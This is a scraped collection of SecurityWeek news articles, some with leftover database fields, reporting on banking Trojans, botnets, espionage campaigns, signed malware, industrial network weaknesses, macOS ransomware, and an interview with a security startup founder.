According to the security firm, while detections have dropped significantly, the threat is still active and Trojans are becoming more advanced in terms of their capabilities. Furthermore, the company says that cybercriminals are increasingly targeting financial institutions via malware or through business email compromise (BEC) scams. Symantec’s Financial threats 2015 whitepaper reveals that the primary distribution vector for financial fraud malware is via malicious attachments in spam email, and that adversaries continued to use Office documents containing malicious macros as droppers in 2015.  Fortunately, Microsoft this week announced a new macro blocking feature in Office 2016 designed to counter the use of malicious macros to deliver malware. Zeus (also known as Trojan.Zbot) was the malware responsible for the largest number of financial Trojan detections last year, with just under one million. However, it showed a significant drop from the 4 million infections registered in 2014, a continuation of a trend observed before, which suggests that criminals are moving to more current, financial malware families. The drop in Zeus infections is said to be the result of a takedown operation conducted in 2014, similar to what happened in November 2015 with the Dyre group. Following law enforcement actions, the Dyre botnet has remained inactive, yet a similar operation conducted against Dridex in October was unsuccessful, with the Trojan achieving high infection rates only one month later. In fact, the report also reveals that Dridex/Cridex, the second most used financial Trojan, more than doubled the number of infections year-on-year in 2015, while Dyre, the third in line, dropped to nearly half of them. Last year, Dridex targeted a total of 315 different institutions and was most active in May and June. A total of 547 institutions in 49 countries were targeted by no less than 656 financial Trojans in 2015, Symantec’s report reveals. According to the security company, the average number of targeted organizations per sample was 93 in 2015, which marked an increase of 232 percent over the previous year. The two most targeted banks were located in the United States, being attacked by 78.2 percent and 77.90 percent of all analyzed Trojans, respectively. Next in line are two banks in the United Kingdom, with 69.36 percent each, followed by a US financial service group with 69.05, and another UK bank, with 68.45 percent of malware targeting it. However, the geographical distribution of financial Trojans shows that banks in other countries are targeted as well, including Spain, Russia, Canada, Switzerland, Australia, Ireland, Germany, and India. In fact, while the US was the most targeted country, Germany and India came on the second and third positions, respectively, followed by Japan and the United Kingdom. Some of the analyzed threats had a narrow geographical focus and were not distributed internationally, Symantec said. Such is the case with Shifu, which was found mainly in Japan last year, although it infected a very small number of computers in the UK, USA, and other countries as well. Shifu targeted a total of 16 financial institutions last year, Symantec says. To increase their effectiveness, threat groups also started targeting mobile phone users, perfecting their malware to circumvent two-factor authentication systems to ensure successful credential theft. The Bankosy Trojan for Android is one such example, as it was designed to make even 2FA systems that use voice calls ineffective. Cybercriminals behind financial Trojans used multiple attack methods, ranging from man-in-the-browser attacks to redirections, the whitepaper reveals. In terms of infection vectors, malicious emails (which included Office documents containing malicious macros as attachments) were preferred the most, followed by drive-by download sites, social engineering, and supply chain hacks, the whitepaper also reveals.

According to Symantec, the company began to sinkhole the infected computers back in July after discovering vulnerabilities in how the ZeroAccess bots communicate with each other. After the researchers noticed a new version of ZeroAccess being distributed that fixed the vulnerabilities, they decided to act.   \"Having seen the changes beginning to roll out, and with a viable plan in place, we were faced with an option: start our operations now or risk losing the initiative,\" Symantec's Security Response team noted.   On a typical day, the botnet has 1.9 million computers under its control. When it comes to making money, its activities are focused on bitcoin mining and click fraud.   \"Out of interest, we took some old hardware that we had lying around in the office to test what kind of impact the ZeroAccess botnet would have in terms of energy usage and the economics of these activities,\" Symantec explained.   \"We infected the test lab computers with ZeroAccess and then set them bitcoin mining, we also had a clean control computer that was just allowed to idle,\" the researchers continued. \"We hooked the computers up to power meters to see the amount of power being consumed by the test computers.\"   \"With this kind of a rig, bitcoin mining with a single computer was always going to be an exercise in futility. Operating this rig for a whole year would only yield a measly US$0.41! But if you had 1.9 million bots available, the equation changes completely. Now thousands of dollars a day could potentially be generated by the botnet.\"   In Symantec's tests simulating the botnet's click fraud operation, each bot generated roughly 257 MB of network traffic every hour. They also generated 42 false ad clicks per hour. Even if each click is valued at only a fraction of a penny, when that is multiplied across 1.9 million machines, the profits for the attacker could reach into the millions, the researchers noted.   \"What this exercise has shown is that despite the resilient P2P architecture of the Zero Access botnet, we have still been able to sinkhole a large portion of the bots,\" according to Symantec. \"This means that these bots will no longer be able to receive any commands from the botmaster and are effectively unavailable to the botnet both for spreading commands and for updating or new revenue generation schemes.\" The company added that it is working with ISPs and CERTs around the globe to share information and get the infected machines cleaned.     Earlier this year, Fortinet was tracking 100,000 new infections per week and almost 3 million unique IP addresses reporting infections. According to security vendor Kindsight, the ZeroAccess botnet was the most active botnet in the wild in 2012, and at one point last year was estimated to be bringing in as much as $100,000 a day for its operator. *Story was updated to fix an incorrect number.

The first Netrepser malware samples were discovered by the security firm in May 2016. No information has been shared on the location of the targets, but researchers determined, based on data from the threat’s command and control (C&C) infrastructure, that the malware had infected more than 500 machines. Most of the victims are government agencies. Bitdefender told SecurityWeek that the attacks are ongoing, and the company has not found any evidence linking this campaign to other threat actors. The Netrepser Trojan is mainly designed for intelligence gathering, and it allows attackers to collect system information, email and instant messaging passwords, session cookies and passwords from web browsers, and keystrokes. “Paired with advanced spear phishing techniques and the malware’s primary focus to collect intelligence and exfiltrate it systematically, we presume that this attack is part of a high-level cyber-espionage campaign,” Bitdefender said in its report. Researchers pointed out that while the attack is complex, the Netrepser malware relies heavily on free tools to carry out various tasks. Experts determined that much of its functionality is provided by a controversial recovery toolkit from Nirsoft, which many antimalware vendors have flagged due to the fact that it can easily be abused for malicious purposes. For example, Nirsoft email and instant messaging password recovery tools are used by the Netrepser malware to steal email and IM passwords. Another Nirsoft utility is used by the Trojan to steal passwords stored in browsers. The list of legitimate tools abused by Netrepser also includes WinRAR, used to compress stolen data before exfiltration, and SDelete from Sysinternals, which is used to delete files likely in an effort to prevent the recovery of forensic evidence. Researchers noted that nearly all third-party tools used in these attacks are packed with what appears to be a custom packer. According to Bitdefender, the Netrepser malware is delivered via spear-phishing emails that carry malicious documents. One of the documents was titled “Russia Partners Drafting guidelines (for directors’ discussion),” but researchers also found files with Russian names that translated to “installation” and “Ural.” The malicious documents leverage macros to deliver the final payload in the form of JavaScript or JavaScript Encoded files. The English-language document appeared to have been sent by Donald Spencer, a managing director of private equity investment firm Siguler Guff. One of the company’s founding partners, Drew Guff, gave a speech last year at the St. Petersburg International Economic Forum. While Bitdefender has refrained from making any statement on attribution, the company pointed out that, in addition to documents, some file paths used by the malware are also written in Cyrillic script.

A new paper from Sophos however argues something that may seem counterintuitive at first – common malware authors in some cases are better at the Q&A process than the minds behind APTs. \"It is counter-intuitive for the general audience, who have little insight and major influence by Hollywood movies,\" the paper's author, Gabor Szappanos, principal researcher at SophosLabs, told SecurityWeek. \"I was not as much surprised. I was analyzing the exploited documents from these groups on a daily basis. My experience was that samples coming from APT groups were easier to analyze, and the ones coming from the more common groups caused me more trouble. That was only an impression, but this research supported it with some factual data.\" In the paper, Sophos analyzed malware samples using CVE-2014-1761, a vulnerability in Microsoft Word that emerged as the third most popular document-based exploit in the final three months of 2014. While a wide range of Microsoft Office versions were impacted by the vulnerability, only Microsoft Office 2010 SP2 (32-bit) was ever attacked, according to the report. The research uncovered that not only did the attackers have a \"limited understanding of, or ability to modify with success, the initial exploit,\" it also revealed that the known APT groups generally showed less sophistication than the more mainstream criminal crews.  During the research, 70 samples using the exploit were analyzed in detail, covering a wide range of different malware authors and families including Plugx, MiniDuke and Tinba. Though neither the APT or commercial malware authors showed enough knowledge to significantly modify the exploit trigger and the initial ROP chain, most of the more infamous APT groups showed the least sophistication, according to the paper. \"There is one additional factor worthy of consideration: whether the exploited RTF samples work or not,\" according to the paper. \"The result was more than surprising: in more than half of the samples, the CVE-2014-1761 exploit didn’t work. This doesn’t mean that the “broken” samples were not able to infect their targets: those were dominantly multi-exploit samples, and the other exploits (usually the good old CVE- 2012-0158) were still successful in infection.\" Considering only the RTF samples that use multiple exploits and removing the ones that are seemingly test files, the real-life multi-exploit combos were found to have a success rate of only 30 percent.  \"It is not trivial to test the operability of this exploit, especially if multiple exploits are present,\" according to the paper. \"Multiple replication environments need to be in place for the proper solution. But this 30% is still a very low number.\" Writing an exploit is definitely more difficult today than it was in the past, Szappanos said. \"But I think that this case more illustrates the segregation in the malware scene: there are a very few people who can build exploits, and a lot of malware groups who try to use the exploit,\" he said. \"Because of the segregation, the malware groups usually don't have exploit experts of their own; instead they use whatever is publicly available for them. As much as they can understand of it. The research shows that in case of complicated exploits, they don't understand the depths of the exploitation.\" The paper can be read here.  " }

In the world of cyber-crime however, it may be more accurate to say imitation is about achieving the highest form of effectiveness. In this case, the Asprox botnet has adopted some of the evasion techniques pioneered stealthy attackers involved in advanced persistent threats (APTs) - namely recognizing the importance of change. During the past several months, researchers at FireEye have been tracking spikes in malicious email detections associated with Asprox and noted that each spike has brought changes in attributes of the attack. \"These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection,\" noted FireEye researchers Amanda Stewart and Grace Timcang. \"Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses.\"  Since its discovery several years ago, Asprox has been linked to a number of spam and malware campaigns. Many of those featured emails related to postal services such as DHL and FedEx. More recently however, the botnet has taken to blasting out messages related to legal matters and has utilized email subject lines such as: \"Urgent court notice\" and \"Mandatory court appearance.\" The recent spate of attacks began in December and has come in cyclical patterns each month, according to FireEye. In late 2013, malware known as Kuluoz, the spam component of the Asprox botnet, was discovered to be the main payload of the first malicious email campaign. Since then, the attackers have updated the malware by changing its hardcoded strings, remote access commands and encryption keys. While previous Asprox campaigns targeted various industries in different countries using a malicious URL link in the body of the email, the latest approach by Asprox hides the malicious payload in zipped email attachments. The campaign appeared to increase in volume in May. By the end of that month, FireEye had observed a significant spike in unique binaries associated with the activity. \"Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29th,\" the researchers explained. \"That is a 16,000 [percent] increase in unique MD5s over the usual malicious email campaign we’d observed. Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign.\" Many of the targets of the campaign were located in the U.S. The hardest hit verticals have been the retail and energy industries, the researchers noted. \"The data reveals that each of the Asprox botnet’s malicious email campaigns changes its method of luring victims and C2 [command and control] domains, as well as the technical details on monthly intervals,\" according to the FireEye researchers. \"And, with each new improvement, it becomes more difficult for traditional security methods to detect certain types of malware.\" " }

The number of certificates issued by certificate authorities (CAs) to companies and independent software developers over the past years has increased considerably. Compared to 2008, when the security firm identified roughly 1,500 certificates that had been used to sign malware and suspicious software, in 2014, after a steady year-over-year increase, the number reached well over 6,000. Using valid or forged digital certificates to sign malicious files is a common technique that has been seen in many advanced persistent threat (APT) operations, including Stuxnet, Winnti and Darkhotel. Threat actors and companies with a shady agenda can acquire certificates by stealing them, or by purchasing them legally. The problem is that, in some cases, CAs don’t investigate the activities of a company before issuing a digital certificate. “It is companies manufacturing potentially unwanted software that most often purchase certificates. On the one hand these companies do not manufacture malware programs, so they can legally purchase a digital certificate to sign their software,” Andrey Ladikov, head of strategic research at Kaspersky Lab, wrote in a blog post. “On the other hand, they produce software annoys users. In fact, they get their software signed with digital certificates precisely to encourage users to trust them.” In addition to legally purchasing certificates, cybercriminals can use several other techniques to sign malware. A rare, but not unheard of, method involves compiling a piece of malware using a company’s build server. Software compiled on these build servers is automatically signed with a digital certificate. These types of attacks are uncommon because major software companies have proper security measures in place to protect their servers. Stealing private keys, which is often done with specialized malware, can also be lucrative because software signed by a reputable developer doesn’t attract suspicion. However, major companies store private keys on dedicated hardware modules, forcing cybercrooks to focus their attention on smaller companies whose networks might not be very secure, Kaspersky said. Another method involves modifying signed Web installers so that they download and install malware instead of the legitimate application. This is done by exploiting weaknesses in the algorithms that check executable file signatures. When CAs discovered that one of their certificates has been misused, they recall it. However, in some cases, especially when the certificate has been used to sign PUAs, the CA doesn’t recall it. The untrusted certificates remain valid in this case and they can be used to sign malicious software. According to Kaspersky, just over half of untrusted certificates are used to sign PUAs, while the rest are used to sign malware. “Given the growing number of threats associated with malicious files signed with digital certificates, users and administrator can no longer risk placing blind faith in signed files and just allow them to be launched simply because they have a digital certificate,” Ladikov said.

BinDiff, which has been owned by Google since it acquired zynamics in 2011, uses a graph-theoretical approach to compare disassembled code. The tool can be used to identify similar and identical functions in different binaries, find changes between two variants of the same function, and port function names, local variable names and comments from one disassembly to another. BinDiff can be used to compare files designed for various architectures, including x86, ARM/AArch64, MIPS and PowerPC. In practice, researchers have been using the tool to analyze multiple versions of a binary, and identify vulnerability fixes in patches released by vendors. BinDiff has also been used in the analysis of malware samples, namely to transfer analysis results from one binary to another in an effort to prevent duplicate analysis. Google has been using the BinDiff core engine as part of its malware processing system – the tool is used to compare binaries and classify malware into related families. “Ever since zynamics joined Google in 2011, we have been committed to keeping our most valuable tools available to the security research community. We first lowered the price, and today we are taking the next logical step by making it available free of charge,” said Google software engineer Christian Blichmann. The current version of BinDiff for Windows and Linux, version 4.2, is available for download from the zynamics website. A commercial version of the Hex-Rays IDA Pro disassembler is needed to use BinDiff. A note on the zynamics website informs users that support is not offered for BinDiff, and developers will decide on a case-by-case basis how to respond to bug submissions, feature requests and general questions. Earlier this month, Google announced that it released its Vendor Security Assessment Questionnaire (VSAQ) framework as open source in an effort to help companies improve their security programs. " }

Blackmoon, also known as KRBanker and Banbra, has been around since at least 2014 and its main goal is to steal online banking credentials from users in South Korea. Just over one year ago, Fortinet researchers reported that the malware had infected the systems of more than 100,000 of the country’s users. Fidelis Cybersecurity reported on Thursday that it had observed two separate Blackmoon campaigns since late 2016, and they relied on a new framework that researchers have named the Blackmoon Downloader Framework. The framework is designed to download several components over three stages, and it ensures that the malware is only delivered to users in South Korea. According to experts, the attack starts with an initial downloader that is under 10 Kb in size. This downloader can execute any code on the infected machine, essentially creating a backdoor, but it serves a simple purpose – downloading and executing a bytecode downloader. In the second stage, the bytecode downloader fetches a PE file disguised as a harmless JPG image. This fake image file, dubbed by Fidelis “KRDownloader,” is responsible for downloading the actual Blackmoon payload. The KRDownloader component is also designed to ensure that the infected system’s language is set to Korean. If the language is not Korean, the bot terminates. “The framework is tightly coupled and designed to operate in sequence to facilitate multiple objectives, including evasion as well as geolocation targeting,” Fidelis said in a blog post. “The multistage downloader serves a practical purpose: It is another tactic used presumably to avoid detection, as functionality is distributed between these separate (but related) components.” Blackmoon is designed to target a long list of websites, including ones belonging to top financial organizations in South Korea, such as Citibank Korea, Hana Bank, KB, Shinhan Bank, Woori Bank, Standard Chartered and Samsung Card. The malware uses a technique known as “pharming” to gather valuable data. When victims access one of the targeted sites from an infected machine, they are redirected to a fake website where they are instructed to provide their credentials and other information. Security firms previously reported that cybercriminals had used various methods to deliver the Blackmoon Trojan, including adware and exploit kits. " }

What makes the CyberX study interesting is the fact that it’s not based on a survey. Instead, the company used data obtained after passively monitoring traffic from 375 OT networks over the past 18 months. The organizations whose networks have been analyzed are from a variety of sectors – including manufacturing, energy and utilities, oil and gas, and pharmaceuticals and chemicals – in the United States, Europe and the Asia-Pacific region. Organizations have often downplayed the risks associated with the presence of vulnerable industrial control systems (ICS) on their networks, claiming that devices are isolated, or air-gapped, and cannot be accessed remotely from the Internet. However, CyberX’s study revealed that roughly one-third of organizations had industrial networks connected to the public Web. These systems are often accessible remotely for convenience, including for remote management, performing software updates, and even web browsing and email from the OT network. More than 80% of industrial sites are running a remote management protocol such as RDP, VNC or SSH, allowing attackers on the OT network to remotely access and control other devices on the network via standard administration tools. Misconfigured wireless access points (WAPs) can also be leveraged as an attack vector, and one in five of the analyzed companies had at least one WAP. CyberX also found that 76% of analyzed industrial sites have machines running obsolete versions of Windows, such as Windows 2000 and Windows XP, on their OT networks. Both Windows devices and industrial systems such as programmable logic controllers (PLCs) had vulnerabilities in 28% of cases. Furthermore, many organizations haven’t made sure that strong authentication mechanisms are in place. In nearly 60% of cases, CyberX has seen plaintext passwords crossing the network, allowing man-in-the-middle (MitM) attackers to obtain valuable information. The analysis shows that Modbus is the most widely used industrial protocol (58%), followed by Ethernet IP (28%), Siemens’ S7, OPC, OSIsoft PI and MMS. Researchers also found that almost half of industrial sites did not have even basic antivirus protection on Windows endpoints. “We’ve heard from customers that adding AV software to endpoints such as HMI workstations can sometimes void the warranty provided by their OT vendors. Vendors are concerned that the overhead of AV scanning software will impact the performance or reliability of their workstations,” CyberX said in its report. “Nevertheless, lack of AV protection increases the risk of having known malware on these systems — such as Conficker, WannaCry, and NotPetya — without even knowing about it.” As a matter of fact, CyberX did see malware in 10% of the analyzed OT networks. The security firm has observed Conficker infections, which is one of the most widespread pieces of malware and it has been known to infect even critical infrastructure organizations. CyberX told SecurityWeek that it also noticed some threats that exhibited behavior consistent with the EternalBlue exploit, which has been used by both the WannaCry ransomware and the NotPetya wiper. The data shows little difference between the security scores of various industries – there is only a +/- 5% variation from the median score of 61% across the analyzed sectors.  " }

Earlier this month, researchers from Dell SecureWorks identified malware they called 'Skeleton Key.' The malware was discovered on a client network that used single-factor authentication for access to webmail and VPN – giving the threat actor total access to remote access services. According to Dell SecureWorks, the malware is deployed as an in-memory patch on a victim's Active Directory domain controllers. In the cases they found, the attackers used the PsExec tool to run the Skeleton Key DLL remotely on the target domain controllers using the rundll32 command.  \"Symantec has analyzed Trojan.Skelky (Skeleton Key) and found that it may be linked to the Backdoor.Winnti malware family,\" blogged Symantec researcher Gavin O'Gorman. \"The attackers behind the Trojan.Skelky campaign appear to have been using the malware in conjunction with this back door threat. It’s unclear if the malware family Backdoor.Winnti is used by one attack group or many groups.\" According to Symantec, Backdoor.Winnti has been used in the past in a number of different campaigns, in particular against Asian gaming companies. It is not known to Symantec if the malware is being used by one set of attackers or many. When Dell SecureWorks researchers revealed their data on Skeleton Key, they noted that the Skeleton Key samples they were of lacked persistence and had to be redeployed when a domain controller is restarted. Between eight hours and eight days of a restart, the threat actors used other remote access malware already deployed on the victim's network to redeploy Skeleton Key on the domain controllers, the researchers said. According to Symantec's telemetry, the Skeleton Key malware was identified on compromised computers in five organizations with offices in the United States and Vietnam, he explained. The exact nature and names of the affected organizations are unknown to Symantec; however the first activity was seen in January 2013 and lasted November 2013. \"In November 2013, the attackers increased their usage of the tool and have been active ever since,\" O'Gorman noted. \"Four more variants of Trojan.Skelky were discovered as well as additional file names used by the attackers.\" Since the first observed use of the tool to the present, the attackers have consistently used the same password. This is the case with three different variants of the tool, O'Gorman explained. The regular use of the same password across multiple variants means it is likely that only one group of attackers had been using the tool until at least January 2015, he added. \"There were almost no signs of other malware active at the same time as Skelky in most of the organizations investigated,\" O'Gorman blogged. \"However, two compromised computers had other malware present, active, and in the same directory, at the same time as Trojan.Skelky. Two files were discovered on one of the victim’s computers. One file is a variant of Backdoor.Winnti (jqs.exe) and the other is a dropper for Backdoor.Winnti (tmp8296.tmp), which is responsible for creating the Backdoor.Winnti sample.\" \"Symantec is continuing its investigation into this malware family Backdoor.Winnti and the specific actors behind the combined use of Backdoor.Winnti and Trojan.Skelky,\" he blogged.  " }

Dudi: I joined Checkpoint in 1997 and I spent there the next 11 years. I saw the company grow from a relatively mid-size company to a large one. Being in the industry for so long allowed me to witness how the security market shifted in the past decade, to consider new approaches, and in general take on a different approach than that of Checkpoint by considering security aspects outside of the perimeter.  SecurityWeek: What brought you to found Seculert? Dudi: First, it was ambition, consider it putting to practice the saying “Follow your Dreams”.  Second, we saw an opportunity in the security market. Looking back, I believed that securing the perimeter on its own was no longer a valid realistic argument, and that we need to protect our data. This led me to start looking at data at rest solutions, and I moved from Checkpoint to SANDesk. At the end of 2009 Aviv Raff, Seculert’s CTO, approached me with a malware sample that that can easily bypass all the traditional security solutions - nobody was able detect this malware and all data was capable of flowing out.  I realized the technology and business opportunity and started the company.  SecurityWeek: What does Seculert do? Dudi: Seculert plays in the advanced threat protection market. At Seculert, we built a Cloud platform which consists of 4 core modules: Botnet interception. We look into botnets we are aware of in advance, infect ourselves purposefully to become part of the botnet, and then intercept malicious traffic from the infected device to the C&C servers. Sandbox technology. We call it the elastic sandbox which also operates in the Cloud. It allows us to look at all the malware that morphs; we look at what it communicates and the payload. Log analysis. This allows our customers to upload outbound HTTP/ HTTPS logs generated by firewalls and proxies. We then take our malware expertise - which we were able to automate and build that knowledge into the Sandbox, allowing the logs to be analyzed in an infinite Cloud environment. API - Customers have invested millions of dollars in security solutions in the past decade so we provide them with an API to integrate our Cloud with their existing security processes. At the end of the day, the customer receives a very detailed actionable report in a very timely fashion whereas the alternative is to rely on existing tools or bring in an expensive professional team once in a while. All this is possible since we’re Cloud-based and are capable of automating our expertise. SecurityWeek: How did you get your idea off the ground? Dudi: Aviv and I are actually relatives so it all started on a Friday evening, sitting on the balcony of my mother in law. Aviv then told me about the idea so we started looking into the market and in parallel, building a PoC. We teamed up with Alex, Seculert’s third co-founder who worked in the past at Finjan with Aviv. We then started talking to potential customers and hear their opinion to see if they’d be interested in such a solution. In mid-2010 we started looking for investors. At that time security wasn’t as sexy as it is today and neither was delivering to enterprise so raising money wasn’t easy. But we were able to receive initial funding from YL Ventures and that allowed us to officially register the company in mid-2010.  SecurityWeek: What are your markets? Dudi: Fortune 5000 enterprises. We focus on all verticals such as finance, energy and healthcare, with a lesser focus on government and education.  SecurityWeek: At what stage is Seculert now? Dudi: Our last funding round was completed last summer. We are currently backed by Norwest Venture Partners - the same VCs that backed FireEye, and Sequoia Capital.  We have 35 employees. 25 employees are based in Israel working on the R&D and the rest are mainly in Silicon Valley, focusing on the sales and marketing activities.  SecurityWeek: What's your business model? Dudi: It’s all subscription-based per the company size, where company size is number of employees.  SecurityWeek: Who are your biggest competitors? Dudi: Obviously this whole market of advanced threats. It’s a boiling market. There are tons of companies, from the traditional vendors up to small startups, that are trying to solve the issue, or part of the issue, with a different kind of offering.  Even though we complement with security analytics platforms such as Splunk and other traditional SIEM systems, we also compete to a certain extent on the budget.  Our key differentiator is the data we provide – it’s fast, accurate, and anything we provide is purely malicious by definition. We’re also the only ones using the Cloud and leveraging it to provide more value to our customers.  SecurityWeek: Where do you think the field is going on from here? Dudi: Amazingly, in the past 18 months security has been moving very fast. Since 2010 we’re seeing that it is moving towards a data approach rather than a signature/ policy or a defense in depth strategy. This has already occurred in other IT arenas, but we’re seeing it now with security. It’s the ability to look at data over time, with the experts, to figure out what is occurring and integrating this ability with the tools that are already in place.  We’re also seeing how point products are moving to a platform product. For a startup, building a platform is a challenge, but that’s the way I believe security is heading. Additionally, because security is growing so fast, the mindset is changing. According to a recent Cisco report there are 1M security professionals missing. As reliance on a human being is going to be more expensive, automation is going to become critical. Organizations will reach that stage where they will be able to rely less on those people that digest alerts and inform them what are the follow up steps in case of an actual breach.  SecurityWeek: Is Seculert hiring? If so, what do you look for when you hire? Dudi: Yes, we’re hiring. In the US we’re looking mainly for sales professionals.  In Israel we’re looking for developers, malware analysts and malware researchers.  In general, I look for those people that want to win. We hire people who want to innovate, are interested in working at a small company and are willing to work as a team.  SecurityWeek: As an entrepreneur, any tips for others starting out? Dudi: Quite a few. First, it’s challenging, but fun. The reason is that it allows you to follow your dreams and make it come true. Second, you have to be very agile and adaptive to change. Third, but definitely not least – learn how listen. Listen to your customers, partners and investors and learn from what they’re saying. SecurityWeek: Other than yours, what is your favorite startup – whether it is in security or not? Dudi: I can’t call it a startup anymore but I have to say it’s Wix. Wix provides a platform for people to develop their own website. They took all these websites and made them into a template so that any mom and pop store could easily move their business to the Internet. It’s become a win-win platform for all the community as they took something tedious and made it to be something that anyone can do.   I like them for a few reasons. First, they built something that impacted lots of people. Second, they build a platform that allows them to grow in the software business. Third, the culture of the company – from what I observe as an outsider, they exhibit something very nice. Fourth, the fact that they took the company to an IPO which is very unusual in Israel.

Turla is also known as Waterbug, KRYPTON and Venomous Bear. Snake, also tracked as Turla and Uroburos, is one of its primary tools. The group is believed to have been active since at least 2006, but experts recently linked it to one of the earliest known state-sponsored cyberespionage operations carried out in the ‘90s. The threat actor initially focused on targeting Windows systems, but in late 2014 Kaspersky Lab reported uncovering a piece of malware designed to work on Linux. Now, Fox-IT has identified what it believes to be a Mac OS X version of Turla’s Snake malware. According to researchers, the sample they found contained debug functionality and it was signed on February 21, which indicates that it’s still under development. An analysis of the Mac malware, delivered by the attackers as an Adobe Flash Player installer, showed that it had actually been ported from the Windows version. Its code included references to the “explorer” process, the Internet Explorer web browser and named pipes. Once deployed, the malware maintains persistence by abusing Apple’s LaunchDaemon service. In order to bypass the GateKeeper security feature, the malware has been signed with a valid developer certificate that was likely stolen by the cyberspies. Fox-IT has notified Apple about the compromised certificate. Experts noticed that the malware’s developers likely speak Russian, based on the use of the KOI8-R character encoding, which covers the Cyrillic alphabet. “This indicates that the developers tested with Russian command output (encoded using the KOI8-R codepage). On systems where the command output is displayed in another language (and another codepage), text would be incorrectly represented in Cyrillic characters,” Fox-IT researchers said in a blog post. The security firm has yet to see any attacks leveraging the OS X version of the Snake malware. The Turla group is believed to be responsible for attacks on many organizations around the world, and despite having its operations exposed by the cybersecurity community on several occasions, the threat actor has continued to launch attacks and improve its tools. In recent weeks, researchers reported seeing a new JavaScript malware used to profile victims, and an improved version of the second-stage backdoor tracked as Carbon and Pfinet. " }
{ "_id" : { "$oid" : "5b27c4f26cefc41c844ab424" }, "Category" : "Malware", "Title" : "New OS X Ransomware Delivered via BitTorrent Client", "Address" : "https://www.securityweek.com/new-os-x-ransomware-delivered-bittorrent-client", "Date" : "March 07, 2016", "Article" : "A piece of ransomware designed to target OS X systems has been delivered to users via the official installer for the BitTorrent client Transmission. The threat was discovered on March 4 by researchers at Palo Alto Networks. Experts noticed that two installers for Transmission 2.90 contained a new piece of OS X malware that they have dubbed KeRanger and which they believe is the first fully functional ransomware targeting OS X. Since Transmission is an open source application, Palo Alto Networks believes the attackers created a malicious version that they planted on the official website after compromising it. The ransomware can bypass Apple’s Gatekeeper protection system because the malicious Transmission versions are signed with a valid app development certificate issued by Apple. Once it infects a system, KeRanger looks for 300 different file types — including documents, images, multimedia files, archives, source code, emails, certificates and databases — and encrypts them using the AES specification. Victims are asked to pay one Bitcoin (roughly $400) to get their files back. In order to prevent users from recovering their files from Time Machine backups, files associated with this application are also encrypted. The ransomware drops a text file containing instructions on how to buy Bitcoin and where to send it in return for the key needed to decrypt files held for ransom. According to researchers, KeRanger was added to Transmission installers as a file named “General.rtf.” While this looks like a harmless document file, it’s actually a Mach-O executable that gets copied to ~/Library/kernel_service and executed before any user interface appears. It’s worth noting that the threat doesn’t immediately start encrypting files on the infected system. Experts determined that KeRanger is designed to wait for three days before connecting to its command and control (C&C) server over the Tor anonymity network, and only then it begins the encryption process.  The developers of the Transmission BitTorrent client have released version 2.92, which removes the ransomware from users’ devices. Transmission 2.91 is not infected, but it doesn’t automatically remove KeRanger from systems, users have been told in a notice posted on the official website. Apple has also taken steps to protect its customers. The company has revoked the certificate abused by KeRanger and it has updated the XProtect anti-malware feature to ensure that the threat cannot cause any damage on OS X systems. Palo Alto believes the malicious version of the Transmission installers was served from the official website between March 4, 11a.m. PST, and March 5, 7p.m. PST. Experts have advised users to check their systems for file associated with the threat even if they downloaded the installer from other sources. KeRanger is believed to be the first fully functional OS X ransomware. In June 2014, Kaspersky Lab reported finding such a threat, which the security firm dubbed “FileCoder,” but that malware seemed unfinished. “As with most Mac malware this strain is exploiting the fact that users routinely login with privileged admin accounts and are free to download and install software from unknown sources. In this case the Gatekeeper check was bypassed using a genuine developer certificate, but as researcher Patrick Wardle has previously demonstrated there are plenty of ways an attacker can bypass Apple’s built-in security boundaries,” James Maude, senior security engineer at Avecto, told SecurityWeek. “In the enterprise this problem is often magnified by the fact OS X users are logging on to devices with full admin accounts. KeRanger exploits the fact that the user has an admin account to install itself into the system library folder and infect the OS. On the Windows platform provisioning all your users with admin account is unthinkable, but when it comes to Macs organisations often 'think different',” Maude added. “Macs in the enterprise are increasingly becoming the weak link in security that attackers are all too happy to exploit. We are seeing an increasing number of malware strains and attacks targeting Mac users who are often left almost unprotected. Our advice is to follow the same best practice on all your devices no matter what the operating system is: patching, least privilege and whitelisting applications,” the expert said. " }

The attack has been linked to the notorious threat actor known as APT28, Pawn Storm, Fancy Bear, Sofacy, Group 74, Sednit, Tsar Team and Strontium. The campaign was apparently aimed at individuals interested in the CyCon U.S. conference organized by the NATO Cooperative Cyber Defence Centre of Excellence (CCDCOE) in collaboration with the Army Cyber Institute at West Point on November 7-8 in Washington, D.C. The hackers created malicious documents with information that was copied from the official CyCon U.S. website. The topic used as bait in this attack suggests that the threat actor targeted individuals with an interest in cyber security. APT28 has been known to use zero-day exploits in its operations and, earlier this month, researchers noticed that the hackers had started leveraging a Flash Player vulnerability that Adobe had patched just two days prior. However, in the campaign analyzed by Cisco Talos, the attackers did not use any zero-days. Instead, they relied on Office documents containing a VBA script. The goal was to deliver Seduploader, a piece of malware which has been used by the threat actor in other NATO-related attacks as well. “In the previous campaign where adversaries used Office document exploits as an infection vector, the payload was executed in the Office word process. In this campaign, adversaries did not use any exploit. Instead, the payload is executed in standalone mode by rundll32.exe,” researchers explained. Seduploader is a reconnaissance malware capable of capturing screenshots, collecting and exfiltrating information about the system, executing code, and downloading files. The variant used in these attacks is slightly different compared to previously known samples, which is likely an attempt to evade detection. The CCDCOE published an alert on its website on Monday to warn people interested in the CyCon conference about the attack. “This is clearly an attempt to exploit the credibility of Army Cyber Institute and NATO CCDCOE in order to target high-ranking officials and experts of cyber security,” the organization said. APT28 is not the only threat actor to use cyber security conferences as a lure in their operations. Last year, Palo Alto Networks reported that a China-linked espionage group known as Lotus Blossom, Elise and Esile had used fake invitations to the company’s Cybersecurity Summit to trick users into installing malware.

